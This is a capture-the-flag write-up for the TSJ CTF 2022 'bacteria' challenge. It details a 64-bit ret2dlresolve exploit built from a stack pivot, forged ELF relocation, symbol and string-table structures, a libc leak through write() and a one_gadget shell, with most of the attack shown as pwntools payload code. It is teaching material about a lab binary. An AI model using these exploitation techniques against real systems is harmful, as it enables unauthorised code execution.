# TSJ CTF 2022 - bacteria

Origin challenge link: https://chal.ctf.tsj.tw/ (closed)

You can also download challenge file in my repo: [bacteria.tar.gz](bacteria.tar.gz)

There will be several files in tar as follows:

- bacteria/docker-compose.yml
- bacteria/Dockerfile
- bacteria/xinetd
- bacteria/share
- bacteria/share/bacteria
- bacteria/share/flag
- bacteria/share/getflag
- bacteria/share/run.sh

Download the tar and untar it, then build with the following command (require [docker-compose](https://docs.docker.com/compose/install/)):

```
docker-compose build && docker-compose up
```

And now we're ready for the exploitation!

# 1. Find bug

First, we will use `file` to check for basic information (outside docker container):

```
$ file bacteria
bacteria: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

So this is a 64-bit file being stripped, it will be hard when we need to debug. Next, we will use `checksec` to check for all defences:

```
$ checksec bacteria
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Nice! We can see that just `NX enabled` which means we cannot execute assembly shellcode on stack. Finally, we will use `objdump` to dump the assembly code of file. 

This is a small binary with just a few assembly code as below:

![objdump.png](images/objdump.png)

So we have `read@plt`, `read@got` and `.text` part. In `.text`, it first read in 0x20 byte to the current rsp and then set the null byte after that input. Finally it add rsp with 0x10 and return. 

So that's means we have the **Buffer Overflow** bug and that's all, we cannot find anything else. So let's move on the next part: Brainstorming!

# 2. Brainstorming

First, we have the **Buffer Overflow** bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has `NX enabled` so we cannot execute assembly shellcode on it. Also because the binary is small, we don't have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.

But we have `read@plt`, which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a `ret2dlresolve`. If you don't know what it is, you can read [here](https://github.com/nhtri2003gmail/ret2dlresolve-64bit).

First, this is a 64-bit file so using `ret2dlresolve` technique may work and may not work for some special case. And we can conduct this technique by 2 ways: faking `link_map` or faking `reloc_arg`

In this challenge, I know that we can fake `reloc_arg` because the base address of binary is `0x400000` so `ret2dlresolve` will not cause error (if base address is `0x600000`, the check function of dlresolver will cause error), also because we don't have any thing to leak `link_map` and to overwrite `link_map` data.

So first, we will try to fake some structures to conduct `ret2dlresolve` to execute whatever function we want. Next, we will try to leak the libc address and then use one gadget to get shell.

- Summary:
  1. Fake structure of Elf64_Sym
  2. Fake structure of Elf64_Rela
  3. Fake STRTAB
  4. Conduct ret2dlresolve
  5. Get shell

# 3. Exploit

Before we continue our exploit, I write this function to attach gdb to the process of bacteria:

<details>
<summary>Code snippet</summary>
<p>

```
def GDB():
	proc = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
	ps = proc.stdout.read().split(b'\n')
	pid = ''
	for i in ps:
		if b'/home/bacteria/bacteria' in i and b'timeout' not in i:
			# Change the split to get the correct pid
			pid = i.split(b'    ')[1].split(b'  ')[0].decode()
			log.info('Process pid: ' + str(pid))

	command = '''
	b*0x401040
	c
	'''
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['sudo', '/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', pid, '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

p = connect('127.0.0.1', 9487)
GDB()
```

</p>
</details>

And remember these GDB command to check for JMPREL, SYMTAB and STRTAB:

```
gef➤  x/3xg   (JMPREL) + (reloc_arg) * 24
gef➤  p/x     (r_info) >> 32     # symbol_number
gef➤  x/3xg   (SYMTAB) + (symbol_number) * 24
gef➤  x/s     (STRTAB) + (st_name)
```

### Table of content
  1. [Stack pivot](#stage-1-stack-pivot-table-of-content)
  2. [Fake address and structure of Elf64_Sym](#stage-2-fake-address-and-structure-of-elf64_sym-table-of-content)
  3. [Fake address and structure of Elf64_Rela](#stage-3-fake-address-and-structure-of-elf64_rela-table-of-content)
  4. [Fake address and structure of STRTAB](#stage-4-fake-address-and-structure-of-strtab-table-of-content)
  5. [Conduct ret2dlresolve & Leak libc address](#stage-5-conduct-ret2dlresolve--leak-libc-address-table-of-content)
  6. [Get shell](#stage-6-get-shell-table-of-content)

---

### Stage 1: Stack pivot ([Table of content](#table-of-content))

First, let's attach gdb to the process of bacteria in the container to get the read & write section so that we can do stack pivot:

![get_rw_section.png](images/get_rw_section.png)

So we know that at address from `0x403000` to `0x404000`, the binary is writable. So we will choose an address of `0x403e00` to stack pivot. Why I choose `0x403e00`, because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing `0x403e00` so we don't need to change a lot.

To do the stack pivot, we also need a `leave; ret` gadget to change the rsp. But because we will execute the `.text` again so we have `leave; ret` already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn't have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.

As we know that the program will first mov the current rsp to rbp and then mov rbp to rsi and write to rsi. So we just need `mov rsi, rbp` to write to our desired address passed to rsi by rbp. Our first payload will be as following:

```
rw_section = 0x403e00
mov_rsi_rbp_read = 0x401027

payload = p64(rw_section)
payload += p64(mov_rsi_rbp_read)
payload += p64(0)*2                 # Just for padding so that we don't need to sleep()
p.send(payload)
```

Running script and we stop at ret, we can see that it's ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)

Status of rbp:
![rw_section_rbp.png](images/rw_section_rbp.png)

Status of code:
![rw_section_code.png](images/rw_section_code.png)

That's look good! Just leave it here for a while and we will continue building exploit later.

### Stage 2: Fake address and structure of Elf64_Sym ([Table of content](#table-of-content))

The reason why I fake Elf64_Sym structure first is because with the address of Elf64_Sym structure, we can calculate the symbol_number and the other stuff.

So first, we will choose an address for Elf64_Sym so that `symbol_numer` is an integer:

```
    <Address of Elf64_Sym> = <SYMTAB> + <symbol_number> * 24
<=> <symbol_number> = ( <Address of Elf64_Sym> - <SYMTAB> ) / 24
```

After a first trying, we know that we can use the address of rw_section to write our fake Elf64_Sym struct. So now we have:

```
SYMTAB = 0x400290
Elf64_Sym_addr  = rw_section                             = 0x403e00
symbol_number   = int(( Elf64_Sym_addr - SYMTAB ) / 24)  = 634
```
Now, we will create a fake struct for Elf64_Sym. The structure of Elf64_Sym is defined as follows:

```
typedef struct elf64_sym {
    Elf64_Word st_name;       /* Symbol name, index in string table (4 bytes)*/
    unsigned char st_info;    /* Type and binding attributes (1 bytes) */
    unsigned char st_other;   /* No defined meaning, 0 (1 bytes) */
    Elf64_Half st_shndx;      /* Associated section index (2 bytes) */
    Elf64_Addr st_value;      /* Value of the symbol (8 bytes) */
    Elf64_Xword st_size;      /* Associated symbol size (8 bytes) */
} Elf64_Sym;
```

The variable we want to fake here is st_name and we just keep the others same as Elf64_Sym of read:

![read_fake_keep.png](images/read_fake_keep.png)

But because our space is limited so we cannot write the struct in 0x10 bytes, the other 0x10 bytes will be use to control the flow. So our Elf64_Sym_Struct would be like this:

```
st_name = p32(0xdeadbeef)        # Unknown, temporary
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
# st_size is null already because the stack now contain all null byte
# so we don't need to write these variable, just need to pad full 0x10 
# bytes so that we don't need to sleep()
Elf64_Sym_struct = st_name + st_info + st_other + st_shndx
```

Because we haven't build up structure for STRTAB so st_name will be `0xdeadbeef`, just temporary and will change when STRTAB is finished. Now we will leave it here and continue with the second struct: Elf64_Rela!

### Stage 3: Fake address and structure of Elf64_Rela ([Table of content](#table-of-content))

First, we will need the address for Elf64_Rela struct to make `reloc_arg` is an integer with the following calculation:

```
    <Address of Elf64_Rela> = <JMPREL> + <reloc_arg> * 24
<=> <reloc_arg> = ( <Address of Elf64_Rela> - <JMPREL> ) / 24
```

After a while trying various address, the address of Elf64_Rela will be `rw_section + 0x40` and we have the following stuffs:

```
JMPREL = 0x400300
Elf64_Rela_addr  = rw_section + 0x40                      = 0x403e40
reloc_arg        = int(( Elf64_Rela_addr - JMPREL) / 24)  = 632
```

Now we will create the structure for Elf64_Rela which is defined as follows:

```
typedef struct elf64_rela {
    Elf64_Addr r_offset;      /* Location at which to apply the action (8 bytes) */
    Elf64_Xword r_info;       /* index and type of relocation (8 bytes) */
    Elf64_Sxword r_addend;    /* Constant addend used to compute value (8 bytes) */
} Elf64_Rela;
```

We will fake r_offset and r_info while r_addend is the same with .rela.plt of read, which is null byte:

![read_JMPREL_GDB.png](images/read_JMPREL_GDB.png)

So our struct for Elf64_Rela will be as following:

```
r_offset = p64(0xdeadbeef)         # Unknown, temporary
r_info = p64((symbol_number << 32) | 0x7)
# r_addend is null and stack is null already so we don't need to write this, 
# also because we run out of 0x10 bytes we can write
Elf64_Rela_struct = r_offset + r_info
```

We know that r_offset is the place which contains the resolved libc address so we will chose the address for that later. Now we will move to the last thing we need to fake: STRTAB.

### Stage 4. Fake address and structure of STRTAB ([Table of content](#table-of-content))

As 2 part above does at the begining, we will choose the address for STRTAB first. This address also have to satisfy this calculation:

```
    <Address for STRTAB> = <STRTAB> + <st_name>
<=> <st_name> = <Address for STRTAB> - <STRTAB>
```

So this is easier because we don't have a division in the calculation. So we will choose any address which doesn't overwrite the other data:

```
STRTAB_addr  = rw_section + 0x80     = 0x403e80
st_name      = STRTAB_addr - STRTAB  = 15296
```

And the struct for STRTAB is just simply a string contain the function we want:

```
STRTAB_struct = b'system\x00\x00'
STRTAB_struct += p64(0)              # Just for padding so we don't need to sleep() when read
```

From here, we have 2 things we haven't done is st_name of Elf64_Sym and r_offset of Elf64_Rela. For st_name, we can get that from STRTAB above so stage 2 will change like this:

```
SYMTAB = 0x400290

Elf64_Sym_addr = rw_section
symbol_number  = int( (Elf64_Sym_addr - SYMTAB) / 24 )

st_name = p32(15296)        # Change here
st_info = p8(0x12)
st_other = p8(0)
st_shndx = p16(0)
st_value = p64(0)
# st_size is null already because the stack now contain all null byte
# so we don't need to write these variable, just need to pad full 0x10 
# bytes so that we don't need to sleep()
Elf64_Sym_struct = st_name + st_info + st_other + st_shndx + st_value
```

And for r_offset, we just leave it as `0xdeadbeef` and will change that after checking the stack. So now we just move to the next stage to know if our struct are in the correct position or not.

### Stage 5. Conduct ret2dlresolve & Leak libc address ([Table of content](#table-of-content))

We have the address for each struct so now just write stuff to stack. Remember where we stopped was at the stage 1 with the following code:

```
rw_section = 0x403e00
mov_rsi_rbp_read = 0x401027

payload = p64(rw_section)           # Fake rbp
payload += p64(mov_rsi_rbp_read)    # rip
payload += p(0)*2                   # Just for padding so that we don't need to sleep()
p.send(payload)
```

So we will need to change the place we stack pivot because we want to write Elf64_Sym at the same time we stack pivot so our first stage will change a bit at the fake rbp:

```
rw_section = 0x403e00
mov_rsi_rbp_read = 0x401027

payload = p64(rw_section - 0x10)    # Fake rbp
payload += p64(mov_rsi_rbp_read)    # rip
payload += p64(0)*2                   # Just for padding so that we don't need to sleep()
p.send(payload)
```

Because we want the Elf64_Sym structure is placed at the correct address so we subtract with 0x10 so that in the next input, we will write the first 0x10 of fake rbp and rip, then the next 0x10 is the Elf64_Sym in the correct address. And when it read for the second time, which means it's reading to the address of rw_section - 0x10. So we will write the ELf64_Sym struct to here with following code:

```
# Write Elf64_Sym structure
payload = p64(Elf64_Rela_addr - 0x10)    # Fake rbp, write and jump to Elf64_Rela address
payload += p64(mov_rsi_rbp_read)
payload += Elf64_Sym_struct
p.send(payload)
```

And with the next input, it will read to the address of `Elf64_Rela_addr - 0x10` so we will write the Elf64_Rela structure with the following code:

```
# Write Elf64_Rela structure
payload = p64(STRTAB_addr - 0x10)        # Fake rbp, write and jump to STRTAB address
payload += p64(mov_rsi_rbp_read)
payload += Elf64_Rela_struct
p.send(payload)
```

And with the next read(), it will write to the STRTAB address so we have the following code:

```
# Write STRTAB structure
payload = p64(0)                         # Check first, change later
payload += p64(mov_rsi_rbp_read)
payload += STRTAB_struct
p.send(payload)
```

We will get the reloc_arg to check if all the structures are set properly or not:

```
print(reloc_arg)
```

and run with GDB attached for debuging:

![check_reloc_arg.png](images/check_reloc_arg.png)

We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let's run until we have inputed all struct and check with the reloc_arg:

![check_structures_position.png](images/check_structures_position.png)

We can see that all of our struct are in the correct position. Now we just need an address of r_offset to puts the resolved function to it. We want when it has just resolved, it will print out the resolved address immediately. Which means when we have just write STRTAB structure, we will write the dlresolver to r_offset. After it resolve, it will print out the libc address which rsi is holding the pointer. 

So the dlresolver and r_offset is in the same address. Because we don't want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of `rw_section - 0x50` for both r_offset and dlresolver so the stage 3 will change to this:

```
JMPREL = 0x400300

Elf64_Rela_addr = rw_section + 0x40
reloc_arg = int( (Elf64_Rela_addr - JMPREL) / 24 )

r_offset = p64(rw_section - 0x50)         # Change here
r_info = p64((symbol_number << 32) | 0x7)
# r_addend is null and stack is null already so we don't need to write this, 
# also because we run out of 0x10 bytes we can write
Elf64_Rela_struct = r_offset + r_info
```

And the rbp when writing STRTAB structure become this:

```
# Write STRTAB structure
payload = p64(rw_section - 0x50)         # Fake rbp, write and jump to ret2dlresolve address
payload += p64(mov_rsi_rbp_read)
payload += STRTAB_struct
p.send(payload)
```

Everything is set! Now we will conduct the ret2dlresolve by faking reloc_arg. To do that, we will need 3 things placed on stack: dlresolver address, reloc_arg and return address. The dlresolver address we can get by analize the read@plt:

![analize_read_plt.png](images/analize_read_plt.png)

So the dlresolver address is `0x401000`, the reloc_arg is `632` above and the return address of course is `mov_rsi_rbp_read` because we will need to input something more.

After it writes STRTAB structure and jump to there, it then write to ret2dlresolve stack address and jump to ret2dlresolve address. With everything we have, the payload will look like this:

```
dlresolver = 0x401000
payload = p64(0)                         # Fake rbp
payload += p64(dlresolver)               # Resolve then execute resolved function 
payload += p64(reloc_arg)
payload += p64(mov_rsi_rbp_read)
p.send(payload)
```

Wait! The hint was we can use `write(0, buf, numofbyte)` to print things out (rdi is always 0) so in the STRTAB structure, we will change from `system` to `write` to print out the resolved libc address. This is the updated of STRTAB structure:

```
STRTAB = 0x4002c0

STRTAB_addr = rw_section + 0x80
st_name = STRTAB_addr - STRTAB

STRTAB_struct = b"write\x00\x00\x00"
STRTAB_struct += p64(0)
```

Running script to here and debug with gdb, we know we ret2dlresolve successfully:

![get_write_libc_function.png](images/get_write_libc_function.png)

This is the function write in libc. Let's check if the rsi contain the address point to r_offset or not:

![rsi_contain_write_libc_address.png](images/rsi_contain_write_libc_address.png)

And here it is! Running through the write function and we get the address of write leaked:

![write_address_leaked.png](images/write_address_leaked.png)

Getting that leak and parsing it with the following code, we can get the libc base address:

```
# Get leaked address
write_addr = u64(p.recv(8))
log.success('Leak address: ' + hex(write_addr))
libc_base = write_addr - 0x1111d0
log.success('Libc base: ' + hex(libc_base))
```

Running script and we get this output:

![get_libc_base.png](images/get_libc_base.png)

Check with libc in GDB and we get the same address:

![get_libc_base_GDB.png](images/get_libc_base_GDB.png)

What a long way! Let's keep going cause we are very close to flag.

### Stage 6. Get shell ([Table of content](#table-of-content))

Now we will get the libc from container to our host and then find one gadget from it:

```
$ docker ps
CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS       PORTS                    NAMES
3ac3689e6140   bacteria_bacteria   "/usr/sbin/xinetd -d…"   12 hours ago   Up 3 hours   0.0.0.0:9487->9487/tcp   bacteria_bacteria_1

$ # docker cp <CONTAINER ID>:<path/of/container> <path/of/host/machine>
$ docker cp 3ac3689e6140:/usr/lib/x86_64-linux-gnu/libc-2.31.so .
```

Using `one_gadget` and we have the following gadget:

![one_gadget.png](images/one_gadget.png)

We will use the first one which has constraints are r12 and r15 have to be null. Examine the register and we can see that r15 is null already, all we need now is r12 have to be null. Everything is easy when we have libc. Using `ROPgadget` and we can get this:

```
$ ROPgadget --binary libc-2.31.so --ropchain | grep xor | grep r12 | grep ret
...
...
0x00000000000d31f0 : xor r12d, r12d ; mov rax, r12 ; pop r12 ; ret
```

We will use this to clear the r12. I use xor because we don't need to add those `p64(0)` then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don't need stack more) so the code for ret2dlresolve will look like this:

```
# Conduct ret2dlresolve
dlresolver = 0x401000
payload = p64(rw_section)           # Fake rbp, choose random writable address
payload += p64(dlresolver)          # Dlresolver
payload += p64(reloc_arg)           # Fake reloc_arg
payload += p64(mov_rsi_rbp_read)    # Return address
p.send(payload)
```

And now, after the leak it will get input from us again. Just pass that xor 12 and one gadget, we created the shell:

```
one_gadget = 0xe6c7e
xor_r12_pop_r12 = 0xd31f0

payload = p64(0)                               # Fake rbp, not use more
payload += p64(libc_base + xor_r12_pop_r12)    # rip
payload += p64(0)                              # For that pop r12
payload += p64(libc_base + one_gadget)         # Return address
p.send(payload)

p.interactive()
```

Full code: [solve.py](solve.py)

# 4. Get flag

I made this write up when the server closed so just can connect to docker container and get the fake flag:

![get_flag.png](images/get_flag.png)